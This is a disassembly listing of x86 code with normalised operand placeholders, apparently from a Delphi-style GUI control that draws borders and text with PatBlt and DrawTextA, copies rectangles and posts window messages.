mov eax ebx
call sub_4840c8
call sub_480f04
test al al
je r-xdata
mov edx 0x2
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
mov edx [ eax + 0x24 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
call sub_424c70
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x98 ]
test al al
jne r-xdata
mov eax ebx
call sub_4840c8
call sub_480ed8
cmp [ eax + 0x29 ] 0x0
je r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xac ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
je r-xdata
xor edx edx
mov eax ebx
call sub_44eba4
or eax 0x100
mov [ ebp - 0x4 ] eax
lea esi [ ebx + 0x190 ]
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424d8c
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x50 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
call sub_4244a4
call sub_43d448
call sub_43d528
test al al
je r-xdata
mov eax ebx
call sub_483f8c
test al al
jne r-xdata
lea edx [ ebx + 0x172 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xa8 ]
lea edx [ ebx + 0x172 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xa4 ]
jmp r-xdata
cmp [ ebx + 0x170 ] 0x0
je r-xdata
mov eax ebx
call sub_4840c8
test eax eax
je r-xdata
mov eax ebx
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
mov edx [ ebx + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4837a2
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_40405c
retn
mov eax ebx
call sub_483e20
mov eax ebx
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov eax ebx
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x1
push 0x1
lea eax [ ebp - 0x14 ]
push eax
call OffsetRect
dec [ ebp - 0xc ]
dec [ ebp - 0x8 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424d8c
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x70 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
mov edx 0x2
call sub_424a9c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4579d8
test al al
jne r-xdata
lea edx [ ebp - 0x28 ]
mov eax ebx
call sub_44c874
mov eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xb0 ]
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xa0 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x64 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
call sub_4244a4
cmp [ ebx + 0x18a ] 0x0
je r-xdata
lea edx [ ebp - 0x2c ]
mov eax ebx
call sub_44c874
mov eax [ ebp - 0x2c ]
push eax
mov eax ebx
call sub_4840c8
call sub_48254c
mov eax [ eax + 0x48 ]
push eax
mov eax ebx
call sub_4840c8
call sub_48254c
mov eax [ eax + 0x4c ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x24 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xb4 ]
cmp [ ebx + 0x18a ] 0x0
je r-xdata
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x48 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0xc ]
call sub_4244a4
sub_4837b8
push esi
mov esi eax
cmp dl [ esi + 0x1a0 ]
je r-xdata
pop esi
retn
mov [ esi + 0x1a0 ] dl
test dl dl
je r-xdata
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4837f4
push ebx
push esi
mov esi edx
mov ebx eax
mov ecx esi
xor edx edx
xor eax eax
call sub_41725c
mov eax ebx
call sub_483f8c
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ ebx + 0x16c ]
cmp [ eax + 0x61 ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47eb58
cmp [ eax + 0x29 ] 0x0
je r-xdata
mov ecx esi
mov edx 0x20
mov eax 0x20
call sub_41725c
mov eax [ ebx + 0x16c ]
call sub_47eb64
test eax eax
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47d74c
call sub_47cb00
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47eb64
cmp [ eax + 0x5c ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47d74c
call sub_47cb00
mov ebx [ eax + 0x38 ]
mov ecx esi
mov edx [ ebx + 0x30 ]
mov eax [ ebx + 0x34 ]
call sub_41725c
jmp r-xdata
mov eax [ ebx + 0x16c ]
call sub_47eb64
mov eax [ eax + 0x5c ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47eb64
mov eax [ eax + 0x5c ]
mov ebx [ eax + 0x38 ]
mov ecx esi
mov edx [ ebx + 0x30 ]
mov eax [ ebx + 0x34 ]
call sub_41725c
jmp r-xdata
sub_4838dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4839b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x16c ]
cmp esi eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4839bd
lea eax [ ebp - 0x4 ]
call sub_404038
retn
test eax eax
je r-xdata
mov [ ebx + 0x16c ] esi
mov eax ebx
mov edx [ eax ]
call [ edx + 0x3c ]
test eax eax
je r-xdata
xor edx edx
call sub_47d8b8
test esi esi
je r-xdata
mov eax [ r-xdata ]
or eax [ ebx + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ ebx + 0x16c ]
mov eax [ eax + 0x24 ]
mov edx eax
sub edx 0x1fffffff
je r-xdata
mov [ ebx + 0x1a0 ] 0x1
mov dl 0x1
mov eax ebx
call sub_44ca38
jmp r-xdata
dec edx
je r-xdata
mov dl [ esi + 0x30 ]
mov eax ebx
call sub_44c794
lea edx [ ebp - 0x4 ]
mov eax [ ebx + 0x16c ]
call sub_47eb74
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_44c8a4
mov dl 0x1
mov eax ebx
call sub_44ca38
jmp r-xdata
jmp r-xdata
cmp eax 0x20000000
jne r-xdata
mov edx eax
mov eax ebx
call sub_44ca14
mov dl 0x1
mov eax ebx
call sub_44ca38
jmp r-xdata
sub_4839c8
push esi
mov esi eax
cmp dl [ esi + 0x18a ]
je r-xdata
pop esi
retn
mov [ esi + 0x18a ] dl
test dl dl
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax esi
call sub_4839f0
sub_4839f0
add esp 0xfffffff0
mov edx [ eax + 0x30 ]
test edx edx
je r-xdata
add esp 0x10
retn
mov [ esp ] 0xb402
xor ecx ecx
mov [ esp + 0x4 ] ecx
mov [ esp + 0x8 ] eax
xor ecx ecx
mov [ esp + 0xc ] ecx
mov ecx esp
mov eax edx
mov edx ecx
call sub_44fe08
sub_483a20
push esi
mov esi eax
cmp esi [ edx + 0x8 ]
sete al
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xd8 ]
cmp [ esi + 0x18a ] 0x0
je r-xdata
pop esi
retn
mov eax esi
call sub_4840c8
cmp [ eax + 0x224 ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ esi + 0x16c ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
sub_483a6c
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi eax
mov eax [ esp ]
cmp eax [ esi + 0x17a ]
jne r-xdata
push esi
lea edi [ esi + 0x17a ]
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
mov edx [ eax ]
call [ edx + 0xdc ]
mov eax [ esp + 0x4 ]
cmp eax [ esi + 0x186 ]
jne r-xdata
mov eax [ esp + 0x8 ]
cmp eax [ esi + 0x182 ]
jne r-xdata
mov eax [ esp + 0xc ]
cmp eax [ esi + 0x186 ]
je r-xdata
add esp 0x10
pop edi
pop esi
retn
sub_483acc
push esi
mov esi eax
cmp edx [ esi + 0x18c ]
je r-xdata
pop esi
retn
mov [ esi + 0x18c ] edx
mov eax esi
call sub_4840c8
test eax eax
je r-xdata
mov eax esi
call sub_4840c8
call sub_44eefc
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xdc ]
sub_483b04
push ebx
push esi
push edi
add esp 0xffffffe8
mov ebx edx
mov edi eax
cmp bl [ edi + 0x171 ]
je r-xdata
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov eax [ edi + 0x4c ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ edi + 0x48 ]
xor edx edx
xor eax eax
call sub_417298
xor eax eax
mov [ esp ] eax
xor eax eax
mov [ esp + 0x4 ] eax
mov [ edi + 0x171 ] bl
mov eax edi
mov edx [ eax ]
call [ edx + 0xdc ]
mov eax edi
mov si 0xffd0
call sub_4034a4
mov eax edi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_483b60
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_483bd4
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push ebx
push 0x0
push 0xb404
mov eax esi
call sub_4530b8
push eax
call PostMessageA
sub_483b94
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
lea edx [ eax + 0x38 ]
mov eax [ esi + 0x38 ]
mov ecx [ eax ]
call [ ecx + 0x78 ]
test al al
jne r-xdata
mov [ edi + 0xc ] 0x1
sub_483bd4
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4840c8
test eax eax
je r-xdata
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
mov eax ebx
call sub_4840c8
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
mov eax esi
call sub_47d670
test al al
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
cmp [ ebx + 0x16c ] 0x0
je r-xdata
mov eax [ ebx + 0x16c ]
call sub_47eddc
sub_483c34
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_44d07c
mov eax [ ebp + 0x8 ]
push eax
mov ecx edi
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x94 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_483c68
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
mov edi [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push eax
mov al [ ebp + 0xc ]
push eax
push edi
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_44d040
cmp [ ebx + 0x16c ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4840c8
cmp [ eax + 0x224 ] 0x0
je r-xdata
mov [ edi ] al
cmp [ edi ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov al 0x1
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
mov al [ ebp + 0xc ]
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403458
mov esi eax
cmp [ esi + 0x40 ] 0x0
setne al
xor al 0x1
mov [ edi ] al
cmp [ edi ] 0x0
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403434
test al al
jne r-xdata
xor esi esi
mov eax ebx
call sub_4840c8
mov al [ eax + 0x227 ]
sub al 0x1
jb r-xdata
sub al 0x2
jne r-xdata
mov eax [ esi + 0x40 ]
cmp eax [ ebx + 0x16c ]
je r-xdata
mov eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
je r-xdata
mov edx [ esi + 0x40 ]
mov eax [ ebx + 0x16c ]
call sub_47d814
xor al 0x1
mov [ edi ] al
cmp eax [ ebp - 0x4 ]
jge r-xdata
adc eax 0x0
mov eax [ ebx + 0x48 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
test esi esi
jne r-xdata
mov eax ebx
call sub_4840c8
mov edx [ ebx + 0x16c ]
call sub_480cd0
mov esi eax
jmp r-xdata
cmp eax [ ebp - 0x4 ]
jle r-xdata
adc eax 0x0
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ esi + 0x40 ]
mov dl 0x1
call sub_484610
mov esi [ ebx + 0x16c ]
mov eax ebx
call sub_4840c8
mov edx [ ebx + 0x16c ]
call sub_481690
mov esi eax
jmp r-xdata
cmp eax [ ebp + 0x10 ]
jge r-xdata
adc eax 0x0
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax ebx
call sub_4840c8
mov edx [ ebx + 0x16c ]
call sub_480cd0
mov esi eax
jmp r-xdata
cmp eax [ ebp + 0x10 ]
jle r-xdata
adc eax 0x0
mov eax ebx
call sub_4840c8
mov edx [ ebx + 0x16c ]
call sub_481690
mov esi eax
sub_483e20
push ebx
mov ebx eax
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_424d8c
mov eax ebx
call sub_4840c8
call sub_48254c
mov edx [ eax + 0x70 ]
mov eax [ ebx + 0x160 ]
mov eax [ eax + 0x10 ]
call sub_424990
mov eax ebx
call sub_4840c8
mov al [ eax + 0x227 ]
sub al 0x2
jb r-xdata
push 0x5a0049
push 0x2
push 0x6
push 0x0
push 0x0
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call PatBlt
push 0x5a0049
mov eax ebx
call sub_44c2bc
sub eax 0x4
push eax
push 0x2
push 0x2
push 0x2
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call PatBlt
push 0x5a0049
mov eax ebx
call sub_44c2bc
push eax
push 0x6
mov eax ebx
call sub_44c2bc
sub eax 0x2
push eax
push 0x0
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call PatBlt
pop ebx
retn
sub al 0x2
jb r-xdata
push 0x5a0049
push 0x6
push 0x2
push 0x0
push 0x0
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call PatBlt
push 0x5a0049
push 0x2
mov eax ebx
call sub_44c278
sub eax 0x6
push eax
push 0x2
push 0x2
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call PatBlt
push 0x5a0049
push 0x6
push 0x2
push 0x0
mov eax ebx
call sub_44c278
sub eax 0x4
push eax
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call PatBlt
jmp r-xdata
pop ebx
retn
sub_483f4c
push ebx
push esi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403278
mov [ esi ] eax
mov eax [ esi ]
mov edx [ ebx + 0x16c ]
mov [ eax + 0x40 ] edx
mov eax [ ebx + 0x16c ]
call sub_47eb58
call sub_47cb00
mov edx [ esi ]
mov [ edx + 0x38 ] eax
mov edx esi
mov eax ebx
call sub_44d0a8
pop esi
pop ebx
retn
sub_483f8c
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x16c ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x16c ]
call sub_47ecd0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x16c ]
cmp [ eax + 0x61 ] 0x0
jne r-xdata
mov al 0x1
sub_483ff4
push ebx
push esi
push edi
mov esi eax
mov bl 0x1
mov edi [ esi + 0x16c ]
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_47eb58
mov al [ eax + 0x28 ]
sub al 0x1
jb r-xdata
xor ebx ebx
jmp r-xdata
je r-xdata
mov eax [ esi + 0x16c ]
mov bl [ eax + 0x51 ]
jmp r-xdata
dec al
je r-xdata
mov bl 0x1
jmp r-xdata
sub_484034
xor edx edx
cmp [ eax + 0x16c ] 0x0
je r-xdata
mov eax edx
retn
mov edx [ eax + 0x16c ]
cmp [ edx + 0x52 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ edx + 0x48 ] 0x0
jne r-xdata
mov edx eax
mov al 0x1
sub_484060
push ebx
push esi
push edi
mov edi eax
xor ebx ebx
mov esi [ edi + 0x16c ]
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_47eb64
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ edi + 0x16c ]
call sub_47eb64
mov bl [ eax + 0x69 ]
sub_4840dc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4840c8
test eax eax
je r-xdata
pop esi
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xdc ]
sub_484100
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_4841d0
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
xor edx edx
xor eax eax
call sub_417298
lea esi [ ebp - 0x10 ]
lea edi [ ebx + 0x190 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
cmp [ ebx + 0x16c ] 0x0
je r-xdata
push 0x400
lea eax [ ebx + 0x190 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x18 ]
mov eax ebx
call sub_44c874
mov eax [ ebp - 0x18 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call DrawTextA
push 0x400
lea eax [ ebx + 0x190 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax [ ebx + 0x16c ]
call sub_47eb74
mov eax [ ebp - 0x14 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x160 ]
call sub_425570
push eax
call DrawTextA
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4841d7
lea eax [ ebp - 0x18 ]
call sub_404038
lea eax [ ebp - 0x14 ]
call sub_404038
retn
sub_4841e0
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi eax
cmp [ esi + 0x16c ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xbc ]
mov eax [ esi + 0x160 ]
mov eax [ eax + 0xc ]
mov edx [ esi + 0x68 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax esi
call sub_484100
mov ebx [ esi + 0x48 ]
mov edi [ esi + 0x4c ]
mov al [ esi + 0x171 ]
sub al 0x2
jb r-xdata
mov edx esp
mov eax esi
call sub_4827b0
mov ebx eax
mov eax [ esi + 0x17a ]
add eax [ esp ]
add ebx eax
mov eax esi
call sub_482720
add ebx eax
add ebx [ esi + 0x182 ]
mov eax esi
call sub_482768
mov edx eax
mov eax [ esp + 0x4 ]
call sub_42be9c
mov edi eax
add edi [ esi + 0x17e ]
add edi [ esi + 0x186 ]
jmp r-xdata
sub al 0x2
jb r-xdata
cmp ebx [ esi + 0x48 ]
jne r-xdata
mov eax esi
call sub_482720
mov ebx eax
mov eax [ esi + 0x17a ]
add eax [ esp ]
add ebx eax
add ebx [ esi + 0x182 ]
mov edx esp
mov eax esi
call sub_4827b0
mov edi eax
mov eax [ esi + 0x17e ]
add eax [ esp + 0x4 ]
add edi eax
mov eax esi
call sub_482768
add edi eax
add edi [ esi + 0x186 ]
jmp r-xdata
push ebx
push edi
mov ecx [ esi + 0x44 ]
mov edx [ esi + 0x40 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x84 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax esi
mov si 0xffd0
call sub_4034a4
cmp edi [ esi + 0x4c ]
je r-xdata
sub_4842f0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov edi edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x16c ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax ebx
call sub_47eb58
call sub_419748
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_44f950
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_480ed8
mov edx [ eax ]
call [ edx + 0x20 ]
xor eax eax
push ebp
push sub_48444f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov edx [ r-xdata ]
call sub_403458
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_47f560
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_47b62c
mov [ ebp - 0x1c ] 0xb411
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_44fe08
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax edi
mov edx [ r-xdata ]
call sub_403458
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47eb58
mov edx [ ebx + 0x40 ]
cmp eax [ edx + 0x4 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_480ed8
mov edx [ eax ]
call [ edx + 0x24 ]
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_44f958
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47eb58
mov edx ebx
call sub_47df90
mov eax [ eax + 0x40 ]
cmp [ eax + 0x170 ] 0x0
je r-xdata
mov eax [ ebx + 0x40 ]
call sub_4193b8
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_4193b8
cmp esi eax
jge r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47eb58
mov edx eax
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ ebx + 0x40 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4840c8
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x6c ]
mov edx [ eax + 0x28 ]
mov eax [ ebx + 0x40 ]
call sub_47f0b8
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4840c8
call sub_480ed8
mov edx [ ebp - 0x8 ]
call sub_419948
mov edi eax
mov eax [ ebp - 0x4 ]
call sub_4840c8
mov eax [ eax + 0x214 ]
mov eax [ eax + 0x6c ]
mov edx [ eax + 0x28 ]
mov eax edi
call sub_47f0b8
mov edx ebx
mov eax [ ebp - 0xc ]
call sub_47f52c
mov edx eax
mov eax edi
call sub_47ee8c
mov edx [ ebp - 0x8 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x14 ]
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
call sub_47eb58
mov edx ebx
call sub_47df90
cmp [ eax + 0x40 ] 0x0
je r-xdata
mov [ ebp - 0x8 ] ebx
jmp r-xdata
mov eax [ ebx + 0x40 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_4840c8
cmp [ eax + 0x224 ] 0x0
je r-xdata
dec [ ebp - 0x8 ]
cmp [ rw-data ] 0x0
je r-xdata
mov edx [ ebx + 0x40 ]
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x20 ]
sub_48455c
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x18b ]
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0x18b ] dl
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
mov eax ebx
mov si 0xffd0
call sub_4034a4
sub_484588
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov edx edi
mov eax ebx
call sub_44ec3c
mov esi [ ebx + 0x16c ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_47d63c
call sub_419748
test eax eax
jle r-xdata
mov eax ebx
call sub_4840c8
call sub_482544
mov ecx [ ebx + 0x4 ]
mov dl 0x1
call [ eax + 0x2c ]
mov edx [ r-xdata ]
call sub_403458
mov esi eax
mov [ esi + 0x270 ] 0x1
mov edx [ ebx + 0x30 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx [ ebx + 0x16c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x124 ]
movsx ecx [ edi + 0xa ]
movsx edx [ edi + 0x8 ]
mov eax esi
call sub_47631c
mov eax esi
call sub_4032a8
sub_484610
push esi
add esp 0xfffffff0
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
add esp 0x10
pop esi
retn
mov [ esi + 0x170 ] dl
test dl dl
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ esp ] 0xb411
xor eax eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] esi
xor eax eax
mov [ esp + 0xc ] eax
mov edx esp
mov eax [ esi + 0x30 ]
call sub_44fe08
sub_484674
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx edx
xor eax eax
push ebp
push sub_4846e3
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
mov edx ebx
mov eax [ rw-data ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov edx [ r-xdata ]
call sub_403458
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4846ea
lea eax [ ebp - 0x4 ]
call sub_404038
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405df8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9d0
call sub_403a74
sub_4846f0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_484735
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48473c
retn
mov eax rw-data
call sub_404038
mov eax rw-data
call sub_405934
mov eax rw-data
call sub_404038
sub_484740
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_48477f
push [ fs : eax ]
